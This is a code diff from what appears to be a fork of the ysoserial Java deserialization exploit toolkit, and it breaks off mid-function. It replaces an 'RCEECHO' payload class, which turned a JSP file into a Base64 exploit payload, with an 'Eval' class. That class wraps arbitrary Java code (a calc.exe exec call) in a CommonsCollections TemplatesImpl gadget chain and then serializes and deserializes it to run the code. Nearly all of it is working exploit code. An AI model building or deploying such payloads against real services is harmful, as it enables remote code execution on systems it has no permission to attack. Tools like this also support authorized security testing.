@@ -1,23 +1,33 @@
 package ysoserial.payloads;
 
-import org.apache.commons.codec.binary.Base64;
+import javassist.ClassPool;
+import javassist.CtClass;
+import ysoserial.Deserializer;
 import ysoserial.Serializer;
-import ysoserial.payloads.util.PayloadRunner;
+
 import java.io.FileReader;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
-public class RCEECHO extends PayloadRunner implements ObjectPayload<Object> {
+public class Eval {
     public static void main(String[] args) throws Exception{
-        byte[] ser = Serializer.serialize(new RCEECHO().getObject("D:\\ysoserial-8\\src\\main\\resources\\Java-Rce-Echo\\Linux\\code\\case2.jsp"));
-        System.out.println(Base64.encodeBase64String(ser));
+        String code = "Runtime.getRuntime().exec(\"calc.exe\");";
+        Object o = new Eval().getObject(CommonsCollections10.class,code);
+        byte[] ser = Serializer.serialize(o);
+        Deserializer.deserialize(ser);
     }
-    public Object getObject(String poc) throws Exception {
-        String code = RCEECHO.getJavaCode(poc);
-        Object evil = new CC_MapTransformer().getObject("RCEECHO;" + code);
-        return evil;
+    public Object getObject(Class gadget,String code) throws Exception {
+        ClassPool pool = ClassPool.getDefault();
+        CtClass clazz = pool.get(gadget.getName());
+        byte[] bytes = clazz.toBytecode();
+        String s = new String(bytes);
+        if(!s.contains("createTemplatesImpl")){
+            throw new Exception("[!] The Gadget must use TemplatesImpl");
+        }
+        ObjectPayload o = (ObjectPayload)gadget.newInstance();
+        return o.getObject("CODE;" + code);
     }
-    public static String getJavaCode(String poc) throws Exception{
+    public static String getJavaCodeFromJSP(String poc) throws Exception{
         FileReader f = new FileReader(poc);
         char[] c = new char[0xffff];
         f.read(c);
